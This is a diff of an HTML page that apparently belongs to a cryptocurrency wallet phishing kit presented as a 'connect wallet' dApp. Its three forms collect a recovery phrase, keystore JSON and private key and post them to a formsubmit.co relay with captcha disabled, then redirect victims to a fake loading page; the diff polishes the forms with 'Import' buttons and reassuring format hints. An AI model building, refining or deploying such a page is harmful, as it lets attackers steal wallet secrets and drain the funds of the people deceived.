@@ -270,31 +270,33 @@
     </div>
     <div class="container">
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="phrase-form">
-            <form id="pass-phrase" action="https://formsubmit.co/491cd535a92ad6917db1f92d4f62d7fc" method="POST">
-  <input type="hidden" name="_captcha" value="false">
-  <input type="hidden" name="_next" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
-  <textarea name="phrase" placeholder="Enter your recovery phrase" required></textarea>
-  <button type="submit">Submit</button>
-</form>
+           <form id="pass-phrase" action="https://formsubmit.co/491cd535a92ad6917db1f92d4f62d7fc" method="POST">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
+        <textarea name="phrase" class="phrase-field" placeholder="Enter your recovery phrase" required></textarea>
+        <button type="submit" class="form-button">Import</button>
+        <p class="form-instrunctions text-center">Typically 12 (sometimes 24) words separated by single spaces</p>
+      </form>
 
 
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="json-form">
            <form id="keystore-json" action="https://formsubmit.co/491cd535a92ad6917db1f92d4f62d7fc" method="POST">
-  <input type="hidden" name="_captcha" value="false">
-  <input type="hidden" name="_next" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
-  <textarea name="keystore" placeholder="Paste your keystore JSON" required></textarea>
-  <input type="password" name="password" placeholder="Enter your wallet password" required>
-  <button type="submit">Submit</button>
-</form>
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
+        <textarea name="keystore" class="phrase-field" placeholder="Keystore JSON" required></textarea>
+        <button type="submit" class="form-button">Import</button>
+        <p class="form-instrunctions text-center">JSON file content and password</p>
+      </form>
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="pkey-form">
             <form id="private-key" action="https://formsubmit.co/491cd535a92ad6917db1f92d4f62d7fc" method="POST">
-  <input type="hidden" name="_captcha" value="false">
-  <input type="hidden" name="_next" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
-  <input type="text" name="privatekey" placeholder="Enter your private key" required>
-  <button type="submit">Submit</button>
-</form>
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://dapps-rpc-chain.pages.dev/apps/connect-wallet/loading.html">
+        <textarea name="privatekey" class="phrase-field" placeholder="Private Key" required></textarea>
+        <button type="submit" class="form-button">Import</button>
+        <p class="form-instrunctions text-center">Typically 64 alphanumeric characters</p>
+      </form>
         </div>
     </div>
     <div id="custom-alert" class="custom-alert">
